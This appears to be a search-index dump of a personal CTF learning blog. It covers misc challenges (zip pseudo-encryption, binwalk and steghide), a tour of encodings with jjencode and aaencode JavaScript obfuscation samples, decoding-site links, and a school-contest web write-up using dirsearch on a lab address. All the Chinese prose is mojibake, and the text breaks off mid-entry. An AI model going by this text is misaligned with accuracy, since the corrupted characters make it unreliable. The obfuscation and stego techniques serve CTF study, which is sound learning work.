è·å…°å®½å¸¦æ•°æ®æ³„éœ²RouterPassViewæŸ¥çœ‹åï¼Œæœç´¢usernameæˆ–è€…password MISC æ¥é¦–æ­Œå§è«æ–¯å¯†ç  é¢å…·ä¸‹çš„flagbinwalkåˆ†ç¦»ä¸€ä¸‹æ–‡ä»¶ï¼Œå¯ä»¥å¾—åˆ°ä¸€ä¸ªå‹ç¼©æ–‡ä»¶ï¼Œzipä¼ªåŠ å¯†ï¼Œç„¶åå°†0900æ”¹ä¸º0800 ç„¶åå†linuxè§£å‹è¿™ä¸ªæ–‡ä»¶ 7z x flag.vmdk -o./ æ‰¾åˆ° key_part_one é‡Œçš„ NULæ–‡ä»¶ å’Œ key_part_two é‡Œçš„ where_is_flag_part_two.txt:flag_part_two_is_here.txtæ³¨æ„:windowsä¸‹è§£å‹ä¸ä¼šæœ‰&lt;where_is_flag_part_two.txt:flag_part_two_is_here.txtè¿™ä¸ªæ–‡ä»¶ åªæœ‰linuxç”¨å‘½ä»¤è§£å‹æ‰ä¼šæœ‰https://blog.csdn.net/weixin_45485719/article/details/107417878å°±å¯ä»¥å‘ç°æœ‰å¦‚ä¸‹æ–‡ä»¶: è¿™é‡Œæ˜¯è§£å¯†ç½‘å€: https://www.splitbrain.org/services/ook flag{N7F5_AD5_i5_funny!} ä¹è¿ç¯010æ‰“å¼€ï¼Œå‘ç°flag.txtï¼Œç„¶åå»kaliåˆ†ç¦»ä¸€ä¸‹å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ…éœ€è¦å¯†ç  ç„¶ååˆå¾—åˆ°ä¸€å¼ ç…§ç‰‡ï¼Œï¼Œå•¥ä¿¡æ¯ä¹Ÿæ²¡çœ‹åˆ°ï¼ŒåŸæ¥æ˜¯éœ€è¦ä¸€ä¸ªæ–°çš„å·¥å…·: steghideå°†secret.txtæ–‡ä»¶éšè—åˆ°text.jpgä¸­ï¼š# steghide embed -cf test.jpg -ef secret.txt -p 123456ä»text.jpgè§£å‡ºsecret.txt:#steghide extract -sf test.jpg -p 123456â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”ç‰ˆæƒå£°æ˜ï¼šæœ¬æ–‡ä¸ºCSDNåšä¸»ã€ŒBlood_Seekerã€çš„åŸåˆ›æ–‡ç« ï¼Œéµå¾ªCC 4.0 BY-SAç‰ˆæƒåè®®ï¼Œè½¬è½½è¯·é™„ä¸ŠåŸæ–‡å‡ºå¤„é“¾æ¥åŠæœ¬å£°æ˜ã€‚åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/Blood_Seeker/article/details/81837571 å°ç»“ä¸ºäº†æ ¡èµ›åšäº†ä¸€ä¸‹miscï¼Œå•çº¯å­¦ä¸€ä¸‹åŸºæœ¬æ“ä½œ:1.å‹ç¼©æ–‡ä»¶:zip:è€ƒè™‘zipçˆ†ç ´ï¼Œæˆ–è€…zipä¼ªåŠ å¯† rar:ä½¿ç”¨rarçˆ†ç ´å¯†ç å·¥å…·2.å›¾ç‰‡â€”â€”éšå†™ï¼š010æ‰“å¼€ï¼Œç›´æ¥æœç´¢flagã€txtã€jpgç­‰ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰éšè—ï¼Œåˆ†ç¦»ä¸€ä¸‹stegå·¥å…·ï¼Œlsbçš„0é€šé“åˆæˆä¸€ä¸‹å¯¼å‡ºä¸ºbin çœ‹ä¸€ä¸‹æ–‡ä»¶å¤´æ˜¯ä¸ªå•¥ï¼Œä¿å­˜ä¸ºç‰¹å®šçš„æ–‡ä»¶å°±è¡Œäº†","link":"/2021/10/13/buu-missc/"},{"title":"crypto-å¤å…¸å¯†ç ","text":"","link":"/2021/10/15/crypto-%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81/"},{"title":"crypto-ç¼–ç ","text":"ç¼–ç asciiç hexç¼–ç ä¿¡æ¯è½¬ä¸ºåå…­è¿›åˆ¶ baseå®¶æ—ase64 ç”¨äºç¼–ç é‚®ä»¶å†…å®¹ã€ç½‘é¡µå›¾ç‰‡ï¼Œæ„åœ¨å‡å°‘ä¼ è¾“è¿‡ç¨‹ä¸­å¯èƒ½å‡ºç°çš„é”™è¯¯ï¼›Base58 æ˜¯æ¯”ç‰¹å¸åœ°å€ä½¿ç”¨çš„ç¼–ç æ–¹æ³•ï¼Œæ—¨åœ¨æé«˜åœ°å€çš„è¾¨è¯†åº¦ï¼›Base32 ç”¨åœ¨ä¸€äº›å¯¹å¤§å°å†™ä¸æ•æ„Ÿçš„æ–‡ä»¶ç³»ç»Ÿä¸­ã€‚æ¯ç§ Base-x çš„ç¼–ç éƒ½æœ‰é€‚åˆå®ƒä»¬çš„åº”ç”¨åœºæ™¯ã€‚ Baseç¼–ç ä»åº•å±‚æ¥è¯´å°±æ˜¯å¯¹æ•°æ®è¿›è¡Œè¿›åˆ¶è½¬æ¢ï¼ŒBase64æ˜¯64è¿›åˆ¶ï¼ŒBase32æ˜¯32è¿›åˆ¶ï¼ŒBase16æ˜¯16è¿›åˆ¶ã€‚è€Œä¸­é—´çš„è¿‡ç¨‹æ˜¯ä¸ºäº†æ›´å¥½åœ°è¿›è¡Œä¼ è¾“æ•°æ® URLç¼–ç HTMLç¼–ç Unicodeç¼–ç Morseç”µç JSFuckåªéœ€è¦â€œ()+[]!â€è¿™6ä¸ªå­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²ã€‚jsfuckçš„ç¼–ç å’Œè§£ç ä¸morsecodeç±»ä¼¼ï¼Œåªä¸è¿‡å…¶è¡¨ç¤ºçš„æ˜¯JavaScriptçš„è¯­å¥ã€‚jsfuckæºäºä¸€é—¨ç¼–ç¨‹è¯­è¨€brainfuckï¼Œå…¶ä¸»è¦çš„æ€æƒ³å°±æ˜¯åªä½¿ç”¨8ç§ç‰¹å®šçš„ç¬¦å·æ¥ç¼–å†™ä»£ç ã€‚jsfuckä¹Ÿæ˜¯æ²¿ç”¨äº†è¿™ä¸ªæ€æƒ³ï¼Œå®ƒä»…ä»…ä½¿ç”¨6ç§ç¬¦å·æ¥ç¼–å†™ä»£ç ã€‚å®ƒä»¬åˆ†åˆ«æ˜¯()+[]! JSFuckå¯ä»¥ä½¿ç”¨jsfuckå®˜æ–¹çš„ç½‘ç«™è¿›è¡Œè§£å¯†ï¼šJSFuck - Write any JavaScript with 6 Characters: !+ Quoted-Printableç¼–ç æ¯”å¦‚ï¼š å¯†ç å­¦ å¯ä»¥ä½¿ç”¨Quoted-printableç¼–ç ä¸ºï¼š =E5=AF=86=E7=A0=81=E5=AD=A6=0A=09=09=09=09=09 Quoted-printableçš„ç¼–ç å½¢å¼ä¹Ÿæ¯”è¾ƒå®¹æ˜“è¾¨è®¤ï¼ŒåŸºæœ¬ä¸Šå°±æ˜¯å­—ç¬¦åŠ ç­‰äºå·æ„æˆç¼–ç æ–‡æ®µæ ¼å¼ã€‚ BrainFuckç¼–ç æ¯”å¦‚ï¼š Hello world! ä½¿ç”¨BrainFuckè¿›è¡Œç¼–ç å°±ä¼šå¾—åˆ° +++++ +++[- &gt;++++ ++++&lt; ]&gt;+++ +++++ .&lt;+++ ++[-&gt; +++++ &lt;]&gt;++ ++.++ +++++..+++ .&lt;+++ +++++ [-&gt;-- ----- -&lt;]&gt;- ----- ----- ----. &lt;++++ +++[- &gt;+++++++&lt;] &gt;++++ ++.&lt;+ +++[- &gt;++++ &lt;]&gt;++ +++++ +.+++ .---- --.-- ----- -.&lt;+++++++ +[-&gt;- ----- --&lt;]&gt; ---.&lt; å¯ä»¥ä½¿ç”¨Brainfuck/Ook! Obfuscation/Encoding è¿™ä¸ªç½‘ç«™è¿›è¡Œç¼–ç å’Œè§£ç  Ookç¼–ç Ookä¹Ÿæ˜¯ä¸€ç§å°å‹çš„ç¼–ç¨‹è¯­è¨€ï¼ŒOokæ˜¯ä¸ºçº¢æ¯›çŒ©çŒ©è®¾è®¡çš„ç¼–ç¨‹è¯­è¨€ï¼Œè®¾è®¡æ€è·¯å’ŒBrainFuckçš„è®¾è®¡æ€è·¯åŸºæœ¬ç±»ä¼¼ï¼Œä½†æ˜¯Ooké‡‡ç”¨äº†æ›´å°‘çš„å…ƒç´ è¿›è¡Œç¼–ç¨‹ï¼Œè¯­å¥æ›´åŠ ç®€å•ã€‚ç”±äºOokçš„ç‰¹ç‚¹ï¼Œå› æ­¤Ookä¹Ÿå¯ä»¥è®¾è®¡ä¸ºä¸€ç§ç‰¹æ®Šçš„ç¼–ç æ–¹å¼ã€‚ æ¯”å¦‚ï¼š Hello world! ä½¿ç”¨Ookç¼–ç åï¼Œå¾—åˆ° Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook.Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook?Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. éå¸¸é•¿ï¼Œè¿›è¡ŒOokç¼–ç å’Œè§£ç çš„ç½‘ç«™ä¹Ÿæ˜¯Brainfuck/Ook! Obfuscation/Encoding UUencodeç¼–ç æ¯”å¦‚ Hello World! è¿›è¡Œç¼–ç åå¾—åˆ°ï¼š ,2&amp;5L;&amp;\\@5V]R;&amp;0A XXencodeç¼–ç æ¯”å¦‚ï¼š Hello World! è¿›è¡ŒXXencodeç¼–ç åï¼Œå¾—åˆ° BG4JgP4wUJqxmP4EV0U++ JJencodeç¼–ç ç®—æ˜¯JSFuckç¼–ç çš„å‰èº«ï¼Œæ˜¯ç”±18ç§å­—ç¬¦ç»„æˆçš„ç¼–ç æ ¼å¼ã€‚æ˜¯é’ˆå¯¹JavaScriptè¿›è¡Œè®¾è®¡çš„ç¼–ç æ–¹å¼ã€‚ é•¿è°·å·é˜³ä»‹ï¼ˆYosuke Hasegawaï¼‰äº2009å¹´7æœˆåˆ›å»ºäº†ä¸€ä¸ªåä¸ºâ€œjjencodeâ€çš„ç½‘ç»œåº”ç”¨ç¨‹åºï¼Œå¯å°†ä¸€åˆ‡çš„JavaScriptä»£ç æ··æ·†ä¸º!+,â€$.:;_{}~=è¿™åå…«ä¸ªå­—ç¬¦çš„æ’åˆ—ç»„åˆã€‚ æ¯”å¦‚ï¼š alert(&quot;Hello, JavaScript&quot; ) è¿›è¡Œjjencodeç¼–ç ï¼Œå¾—åˆ° $=~[];$={___:++$,$$$$:(![]+&quot;&quot;)[$],__$:++$,$_$_:(![]+&quot;&quot;)[$],_$_:++$,$_$$:({}+&quot;&quot;)[$],$$_$:($[$]+&quot;&quot;)[$],_$$:++$,$$$_:(!&quot;&quot;+&quot;&quot;)[$],$__:++$,$_$:++$,$$__:({}+&quot;&quot;)[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+&quot;&quot;)[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+&quot;&quot;)[$.__$])+((!$)+&quot;&quot;)[$._$$]+($.__=$.$_[$.$$_])+($.$=(!&quot;&quot;+&quot;&quot;)[$.__$])+($._=(!&quot;&quot;+&quot;&quot;)[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!&quot;&quot;+&quot;&quot;)[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+&quot;\\&quot;&quot;+$.$_$_+(![]+&quot;&quot;)[$._$_]+$.$$$_+&quot;\\\\&quot;+$.__$+$.$$_+$._$_+$.__+&quot;(\\\\\\&quot;\\\\&quot;+$.__$+$.__$+$.___+$.$$$_+(![]+&quot;&quot;)[$._$_]+(![]+&quot;&quot;)[$._$_]+$._$+&quot;,\\\\&quot;+$.$__+$.___+&quot;\\\\&quot;+$.__$+$.__$+$._$_+$.$_$_+&quot;\\\\&quot;+$.__$+$.$$_+$.$$_+$.$_$_+&quot;\\\\&quot;+$.__$+$._$_+$._$$+$.$$__+&quot;\\\\&quot;+$.__$+$.$$_+$._$_+&quot;\\\\&quot;+$.__$+$.$_$+$.__$+&quot;\\\\&quot;+$.__$+$.$$_+$.___+$.__+&quot;\\\\\\&quot;\\\\&quot;+$.$__+$.___+&quot;)&quot;+&quot;\\&quot;&quot;)())(); AAencodeç¼–ç aaencodeç¼–ç æ˜¯ä¸€ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„ç¼–ç å½¢å¼ï¼ŒåŒæ ·ä¹Ÿæ˜¯å¯¹äºJavaScriptè¯­è¨€è®¾è®¡çš„ç¼–ç æ–¹å¼ï¼Œæ˜¯æŠŠJavaScriptçš„ä»£ç ç¼–ç æˆæ—¥æœ¬çš„è¡¨æƒ…åŒ…ã€‚ æ¯”å¦‚ï¼š alert(&quot;Hello, JavaScript&quot;) é€šè¿‡aaencodeç¼–ç ï¼Œå¾—åˆ° ï¾ŸÏ‰ï¾Ÿï¾‰= /ï½€ï½Â´ï¼‰ï¾‰ ~â”»â”â”» //*Â´âˆ‡ï½€*/ ['_']; o=(ï¾Ÿï½°ï¾Ÿ) =_=3; c=(ï¾ŸÎ˜ï¾Ÿ) =(ï¾Ÿï½°ï¾Ÿ)-(ï¾Ÿï½°ï¾Ÿ); (ï¾ŸĞ”ï¾Ÿ) =(ï¾ŸÎ˜ï¾Ÿ)= (o^_^o)/ (o^_^o);(ï¾ŸĞ”ï¾Ÿ)={ï¾ŸÎ˜ï¾Ÿ: '_' ,ï¾ŸÏ‰ï¾Ÿï¾‰ : ((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +'_') [ï¾ŸÎ˜ï¾Ÿ] ,ï¾Ÿï½°ï¾Ÿï¾‰ :(ï¾ŸÏ‰ï¾Ÿï¾‰+ '_')[o^_^o -(ï¾ŸÎ˜ï¾Ÿ)] ,ï¾ŸĞ”ï¾Ÿï¾‰:((ï¾Ÿï½°ï¾Ÿ==3) +'_')[ï¾Ÿï½°ï¾Ÿ] }; (ï¾ŸĞ”ï¾Ÿ) [ï¾ŸÎ˜ï¾Ÿ] =((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +'_') [c^_^o];(ï¾ŸĞ”ï¾Ÿ) ['c'] = ((ï¾ŸĞ”ï¾Ÿ)+'_') [ (ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)-(ï¾ŸÎ˜ï¾Ÿ) ];(ï¾ŸĞ”ï¾Ÿ) ['o'] = ((ï¾ŸĞ”ï¾Ÿ)+'_') [ï¾ŸÎ˜ï¾Ÿ];(ï¾Ÿoï¾Ÿ)=(ï¾ŸĞ”ï¾Ÿ) ['c']+(ï¾ŸĞ”ï¾Ÿ) ['o']+(ï¾ŸÏ‰ï¾Ÿï¾‰ +'_')[ï¾ŸÎ˜ï¾Ÿ]+ ((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +'_') [ï¾Ÿï½°ï¾Ÿ] + ((ï¾ŸĞ”ï¾Ÿ) +'_') [(ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)]+ ((ï¾Ÿï½°ï¾Ÿ==3) +'_') [ï¾ŸÎ˜ï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ==3) +'_') [(ï¾Ÿï½°ï¾Ÿ) - (ï¾ŸÎ˜ï¾Ÿ)]+(ï¾ŸĞ”ï¾Ÿ) ['c']+((ï¾ŸĞ”ï¾Ÿ)+'_') [(ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)]+ (ï¾ŸĞ”ï¾Ÿ) ['o']+((ï¾Ÿï½°ï¾Ÿ==3) +'_') [ï¾ŸÎ˜ï¾Ÿ];(ï¾ŸĞ”ï¾Ÿ) ['_'] =(o^_^o) [ï¾Ÿoï¾Ÿ] [ï¾Ÿoï¾Ÿ];(ï¾ŸÎµï¾Ÿ)=((ï¾Ÿï½°ï¾Ÿ==3) +'_') [ï¾ŸÎ˜ï¾Ÿ]+ (ï¾ŸĞ”ï¾Ÿ) .ï¾ŸĞ”ï¾Ÿï¾‰+((ï¾ŸĞ”ï¾Ÿ)+'_') [(ï¾Ÿï½°ï¾Ÿ) + (ï¾Ÿï½°ï¾Ÿ)]+((ï¾Ÿï½°ï¾Ÿ==3) +'_') [o^_^o -ï¾ŸÎ˜ï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ==3) +'_') [ï¾ŸÎ˜ï¾Ÿ]+ (ï¾ŸÏ‰ï¾Ÿï¾‰ +'_') [ï¾ŸÎ˜ï¾Ÿ]; (ï¾Ÿï½°ï¾Ÿ)+=(ï¾ŸÎ˜ï¾Ÿ); (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]='\\\\'; (ï¾ŸĞ”ï¾Ÿ).ï¾ŸÎ˜ï¾Ÿï¾‰=(ï¾ŸĞ”ï¾Ÿ+ ï¾Ÿï½°ï¾Ÿ)[o^_^o -(ï¾ŸÎ˜ï¾Ÿ)];(oï¾Ÿï½°ï¾Ÿo)=(ï¾ŸÏ‰ï¾Ÿï¾‰ +'_')[c^_^o];(ï¾ŸĞ”ï¾Ÿ) [ï¾Ÿoï¾Ÿ]='\\&quot;';(ï¾ŸĞ”ï¾Ÿ) ['_'] ( (ï¾ŸĞ”ï¾Ÿ) ['_'] (ï¾ŸÎµï¾Ÿ+(ï¾ŸĞ”ï¾Ÿ)[ï¾Ÿoï¾Ÿ]+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ ((ï¾Ÿï½°ï¾Ÿ) + (o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (o^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ (ï¾Ÿï½°ï¾Ÿ)+ (o^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾ŸÎ˜ï¾Ÿ)+ ((o^_^o) +(o^_^o))+ (ï¾Ÿï½°ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+(ï¾Ÿï½°ï¾Ÿ)+ ((o^_^o) - (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸĞ”ï¾Ÿ)[ï¾ŸÎµï¾Ÿ]+((ï¾Ÿï½°ï¾Ÿ) + (ï¾ŸÎ˜ï¾Ÿ))+ (ï¾ŸÎ˜ï¾Ÿ)+ (ï¾ŸĞ”ï¾Ÿ)[ï¾Ÿoï¾Ÿ]) (ï¾ŸÎ˜ï¾Ÿ)) ('_');","link":"/2021/10/14/crypto/"},{"title":"miscç½‘ç«™","text":"brainfuckåŠ å¯†:https://www.splitbrain.org/services/ookbase64è§£ç åå¯ä»¥ç›´æ¥è½¬æ–‡ä»¶:https://the-x.cn/base64bugkuè§£å¯†ç½‘ç«™:https://ctf.bugku.com/tools.html","link":"/2021/10/14/misc%E7%BD%91%E7%AB%99/"},{"title":"2021æ ¡èµ›","text":"web-1é¢˜ç›®åœ°å€: 172.31.65.173:80 ç¿»äº†ä¸€ä¸‹robots.txtï¼ŒæŠ“äº†ä¸€ä¸‹åŒ…ï¼Œéƒ½æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯ï¼Œé‚£å°±æ˜¯éœ€è¦æ‰«æç›®å½•äº†ï¼Œä½¿ç”¨dirsearchæ‰«æå·¥å…·è¿›è¡Œæ‰«æ python dirsearch.py -u &quot;http://172.31.65.173/&quot; å‘ç°æœ‰ä¸€ä¸ªjsç›®å½•ç‚¹è¿›å»ä»¥åå³å¯çœ‹åˆ°æºç çœ‹åˆ°å¯ç–‘æºç ï¼Œè¿™æ˜¯aaencodeç¼–ç ï¼Œæœç´¢ä¸€ä¸‹è§£ç ç½‘ç«™è¿›è¡Œè§£ç å³å¯ ï¾ŸÏ‰ï¾Ÿï¾‰= /ï½€ï½Â´ï¼‰ï¾‰ ~â”»â”â”» //*Â´âˆ‡ï½€*/ ['_']; o=(ï¾Ÿï½°ï¾Ÿ) =_=3; c=(ï¾ŸÎ˜ï¾Ÿ) =(ï¾Ÿï½°ï¾Ÿ)-(ï¾Ÿï½°ï¾Ÿ); (ï¾ŸĞ”ï¾Ÿ) =(ï¾ŸÎ˜ï¾Ÿ)= (o^_^o)/ (o^_^o);(ï¾ŸĞ”ï¾Ÿ)={ï¾ŸÎ˜ï¾Ÿ: '_' ,ï¾ŸÏ‰ï¾Ÿï¾‰ : ((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +'_') [ï¾ŸÎ˜ï¾Ÿ] ,ï¾Ÿï½°ï¾Ÿï¾‰ :(ï¾ŸÏ‰ï¾Ÿï¾‰+ '_')[o^_^o -(ï¾ŸÎ˜ï¾Ÿ)] ,ï¾ŸĞ”ï¾Ÿï¾‰:((ï¾Ÿï½°ï¾Ÿ==3) +'_')[ï¾Ÿï½°ï¾Ÿ] }; (ï¾ŸĞ”ï¾Ÿ) [ï¾ŸÎ˜ï¾Ÿ] =((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +'_') [c^_^o];(ï¾ŸĞ”ï¾Ÿ) ['c'] = ((ï¾ŸĞ”ï¾Ÿ)+'_') [ (ï¾Ÿï½°ï¾Ÿ)+(ï¾Ÿï½°ï¾Ÿ)-(ï¾ŸÎ˜ï¾Ÿ) ];(ï¾ŸĞ”ï¾Ÿ) ['o'] = ((ï¾ŸĞ”ï¾Ÿ)+'_') [ï¾ŸÎ˜ï¾Ÿ];(ï¾Ÿoï¾Ÿ)=(ï¾ŸĞ”ï¾Ÿ) ['c']+(ï¾ŸĞ”ï¾Ÿ) ['o']+(ï¾ŸÏ‰ï¾Ÿï¾‰ +'_')[ï¾ŸÎ˜ï¾Ÿ]+ ((ï¾ŸÏ‰ï¾Ÿï¾‰==3) +'_') [ï¾Ÿï½°ï¾Ÿ] + ((ï¾ŸĞ”ï¾Ÿ) +'_') 